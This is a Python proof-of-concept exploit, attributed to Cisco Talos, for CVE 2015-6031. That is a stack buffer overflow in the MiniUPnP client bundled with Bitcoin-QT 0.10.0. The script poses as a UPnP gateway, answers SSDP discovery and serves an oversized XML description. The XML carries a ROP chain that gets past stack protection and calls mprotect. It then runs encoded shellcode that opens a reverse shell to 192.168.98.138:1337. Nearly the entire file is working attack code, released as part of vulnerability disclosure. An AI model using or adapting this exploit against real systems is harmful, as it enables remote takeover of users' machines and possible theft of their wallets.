"""

░▀█▀░█▀█░█░░░█▀█░█▀▀░░░█░█░█░█░█░░░█▀█░█▀▄░█▀▀░█░█░
░░█░░█▀█░█░░░█░█░▀▀█░░░▀▄▀░█░█░█░░░█░█░█░█░█▀▀░▀▄▀░
░░▀░░▀░▀░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀░░▀▀▀░░▀░░
  T   A   L   O   S     V   U   L   N   D   E   V

Proof-of-Concept Exploit
Release Date: 2016-01-27

TALOS-2015-0035
CVE 2015-6031

Impact: Remote Code Execution
Target: Bitcoin-QT (included MiniUPnP client)

Tested Configuration: 
Bitcoin-QT 0.10.0
Fedora 22 x86

Author: Aleksandar Nikolic, Cisco Talos

Notes:
This exploit illustrates an SSP bypass for stack buffer overflow in applications that use pthreads. 

"""


import socket
import struct

#SSDP reply to MSEARCH request, specifies the location URL
reply = """HTTP/1.1 200 OK
CACHE-CONTROL: max-age=120
ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1
USN: uuid:50b983c3-f96b-4f3f-b683-3071be3f126b::urn:schemas-upnp-org:device:InternetGatewayDevice:1
EXT:
SERVER: Fedora/20 UPnP/1.1 MiniUPnPd/1.9
LOCATION: http://192.168.98.138:1900/rootDesc.xml
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
01-NLS: 1437429835
BOOTID.UPNP.ORG: 1437429835
CONFIGID.UPNP.ORG: 1337\n\r\n\r
"""

#reverse shellcode to 192.168.98.138:1337, xor encoded to avoid bad chars
reverse_shell = "\x90"*4 + "\x31\xd2\x31\xc9\x31\xc0\xeb\x10\x5e\xb0\x88\xb1\x4a\x30\x06" /
						   "\x46\xfe\xc9\x38\xd1\x75\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xe2" /
						   "\xee\xd0\xe2\x89\xd3\xb9\x5a\xda\xdb\xe2\x8a\x01\x69\x45\x08" /
						   "\x1a\x38\xee\xe0\xf7\x89\x89\x89\xee\xe0\x8d\xb1\xcb\xee\xdb" /
						   "\x01\x69\xe2\x98\xd9\xda\x01\x69\xcb\x45\x08\xe2\x8a\xd1\x0f" /
						   "\x52\x38\xb7\x45\x08\xc1\xf1\x71\x38\x83\xc9\x01\x42\xda\xe0" /
						   "\xa7\xa7\xfb\xe0\xe0\xa7\xea\xe1\xe6\x01\x6b\x45\x08" 
mprotect = 0xb6d49350 # address of mprotect in libc
fix = 0xb04fdb50 	  # the address of SYSINFO pointer that we need to fix 
kernel_vssycall = 0xb7fdbbb0 # original value of SYSINFO pointer that we need to restore
valid_addr = 0xbfffffc0	# ROP gadgets require R/W memory address, this is a safe bet

add_esp_pop = 0x8064d24a
"""
   0x8064d24a:	add    esp,0x13ec
   0x8064d250:	pop    ebx
   0x8064d251:	pop    esi
   0x8064d252:	pop    edi
   0x8064d253:	pop    ebp
   0x8064d254:	ret

   A nifty little gadget that gets esp pointing at our buffer 
   and pops four registers from it. 
"""

mov_esi_edi = 0x806a2817
"""
   0x806a2817:	mov    DWORD PTR [esi],edi
   0x806a2819:	mov    esi,DWORD PTR [esp+0x14]
   0x806a281d:	mov    edi,DWORD PTR [esp+0x18]
   0x806a2821:	add    esp,0x1c
   0x806a2824:	ret   

   Since, through the previous gadget, we control esi and edi,
   this gadget can be used as a write-4-anywhere primitive. 
   We use it to repair the overwriten __kernel_vsyscall pointer.
"""


rootDesc ="""HTTP/1.1 200 OK
Content-Type: text/xml; charset="utf-8"
Connection: close
Content-Length: 14566
Server: Fedora/20 UPnP/1.1 MiniUPnPd/1.9
Ext:

<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0"><"""
rootDesc += "A"*4308 + "CCCC" #start the overflow
#this is where we return for the first ROP gadget
rootDesc += struct.pack("<I",fix) # stack pointer to kernel_vsyscall 
rootDesc += struct.pack("<I",kernel_vssycall) #actuall address of vsyscall
rootDesc += "FFFF"	#JUNK
rootDesc += struct.pack("<I",mov_esi_edi) # fix the overwritten kernel_vsyscall pointer
rootDesc += "D"*14 #stack alignment
rootDesc += struct.pack("<I",valid_addr)*2 # previous gadget needs a valid esp address to r/w
rootDesc += "D"*6 #stack alignment
rootDesc += struct.pack("<I",mprotect) #setup call to mprotect
rootDesc += struct.pack("<I",0xb04fdb50-len(reverse_shell))*2 #mprotect address, we don't care about the size
rootDesc += "A"*(1344-len(reverse_shell)) + reverse_shell  + "CCCC" 
rootDesc += struct.pack("<I",add_esp_pop) # this overwrites the kernel_vsyscall pointer initially and kickstarts the ROP
rootDesc += "></asd></root>"


multicast_group = '239.255.255.250'
server_address = ("", 1900)

# Create the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind to the server address
sock.bind(server_address)

# we want this to be part of the multicast group
# so we can see the request
group = socket.inet_aton(multicast_group)
mreq = struct.pack('4s', group)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq+ socket.inet_aton("192.168.98.138"))

m=sock.recvfrom(1024)
message = m[0]
client = m[1]
print "Recived broadcase from %s on port %d"%(client[0],client[1])
if "M-SEARCH"  in message:
	print "Got a MSEARCH request"
	print "Replying"
	sock.sendto(reply,client) # send the MSEARCH reply and then wait for the victim to request the XML
	tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tcp_sock.bind(server_address)
	tcp_sock.listen(1)
	while True: 
		connection, client_address = tcp_sock.accept()
		msg = connection.recv(1024)
		print "Got tcp request"
		if "rootDesc.xml" in msg:
			print "Sending rootDesc.xml"
			connection.send(rootDesc) # finally, send the packed XML with the payload
			connection.close()
			print "Done!"
			break
